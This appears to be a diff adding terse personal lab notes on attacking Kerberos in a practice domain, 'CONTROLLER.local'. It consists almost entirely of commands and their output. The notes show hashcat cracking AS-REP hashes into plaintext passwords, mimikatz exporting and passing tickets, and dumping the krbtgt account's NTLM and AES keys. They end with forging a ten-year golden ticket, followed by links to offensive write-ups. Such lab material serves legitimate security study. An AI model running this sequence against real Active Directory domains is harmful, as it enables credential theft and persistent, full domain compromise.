+P@$$W0rd2        ($krb5asrep$Admin2@CONTROLLER.local)
+Password3        ($krb5asrep$User3@CONTROLLER.local)
+2g 0:00:00:00 DONE (2021-03-25 11:24) 66.66g/s 34133p/s 68266c/s 68266C/s diego..moomoo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+      
+>ssh machine1@10.10.244.16
+>cd Downloads
+>.\mimikatz.exe
+>mimikatz# privilege::debug
+>mimikatz# sekurlsa::tickets /export
+>mimikatz# kerberos::ptt [0;b9884]-0-1-40a10000-Administrator@CONTROLLER-1-SQLService.CONTROLLER.local~30111.kirbi
+>mimikatz# exit
+
+>klist
+Cached Tickets: (2)
+#0>     Client: Administrator @ CONTROLLER.LOCAL
+        Server: krbtgt/CONTROLLER.LOCAL @ CONTROLLER.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 3/25/2021 4:37:23 (local)
+        End Time:   3/25/2021 14:37:23 (local)
+        Renew Time: 4/1/2021 4:37:23 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called: CONTROLLER-1
+
+>.\mimika
+>ssh administrator@10.10.244.16
+>cd Downloads
+>.\mimikatz.exe
+>mimikatz# privilege::debug
+lsadump::lsa /inject /name:krbtgt
+
+Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 
+
+RID  : 000001f6 (502)
+User : krbtgt
+
+ * Primary
+    NTLM : 72cd714611b64cd4d5550cd2759db3f6 
+    LM   :
+  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6
+    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6
+    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6
+
+ * WDigest
+    01  d2e9aa3caa4509c3f11521c70539e4ad
+    02  c9a868fc195308b03d72daa4a5a4ee47
+    03  171e066e448391c934d0681986f09ff4
+    04  d2e9aa3caa4509c3f11521c70539e4ad
+    05  c9a868fc195308b03d72daa4a5a4ee47
+    06  41903264777c4392345816b7ecbf0885
+    07  d2e9aa3caa4509c3f11521c70539e4ad
+    08  9a01474aa116953e6db452bb5cd7dc49
+    09  a8e9a6a41c9a6bf658094206b51a4ead
+    10  8720ff9de506f647ad30f6967b8fe61e
+    11  841061e45fdc428e3f10f69ec46a9c6d
+    12  a8e9a6a41c9a6bf658094206b51a4ead
+    13  89d0db1c4f5d63ef4bacca5369f79a55
+    14  841061e45fdc428e3f10f69ec46a9c6d
+    15  a02ffdef87fc2a3969554c3f5465042a
+    16  4ce3ef8eb619a101919eee6cc0f22060
+    17  a7c3387ac2f0d6c6a37ee34aecf8e47e
+    18  085f371533fc3860fdbf0c44148ae730
+    19  265525114c2c3581340ddb00e018683b
+    20  f5708f35889eee51a5fa0fb4ef337a9b
+    21  bffaf3c4eba18fd4c845965b64fca8e2
+    22  bffaf3c4eba18fd4c845965b64fca8e2
+    23  3c10f0ae74f162c4b81bf2a463a344aa
+    24  96141c5119871bfb2a29c7ea7f0facef
+    25  f9e06fa832311bd00a07323980819074
+    26  99d1dd6629056af22d1aea639398825b
+    27  919f61b2c84eb1ff8d49ddc7871ab9e0
+    28  d5c266414ac9496e0e66ddcac2cbcc3b
+    29  aae5e850f950ef83a371abda478e05db
+
+ * Kerberos
+    Default Salt : CONTROLLER.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 79bf07137a8a6b8f
+
+ * Kerberos-Newer-Keys
+    Default Salt : CONTROLLER.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : dfb518984a8965ca7504d6d5fb1cbab56d444c58ddff6c193b64fe6b6acf1033
+      aes128_hmac       (4096) : 88cc87377b02a885b84fe7050f336d9b
+      des_cbc_md5       (4096) : 79bf07137a8a6b8f
+
+ * NTLM-Strong-NTOWF
+    Random Value : 4b9102d709aada4d56a27b6c3cd14223
+
+
+ >mimikatz# Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
+User      : Administrator 
+Domain    : controller.local (CONTROLLER)
+SID       : S-1-5-21-432953485-3795405108-1502158860
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 72cd714611b64cd4d5550cd2759db3f6 - rc4_hmac_nt
+Lifetime  : 3/25/2021 4:58:59 AM ; 3/23/2031 4:58:59 AM ; 3/23/2031 4:58:59 AM
+-> Ticket : ticket.kirbi
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted 
+ * KrbCred generated
+
+Final Ticket Saved to file !
+
+
+https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a
+https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
+https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1
+https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
+https://www.varonis.com/blog/kerberos-authentication-explained/
+https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
+https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf
+https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf
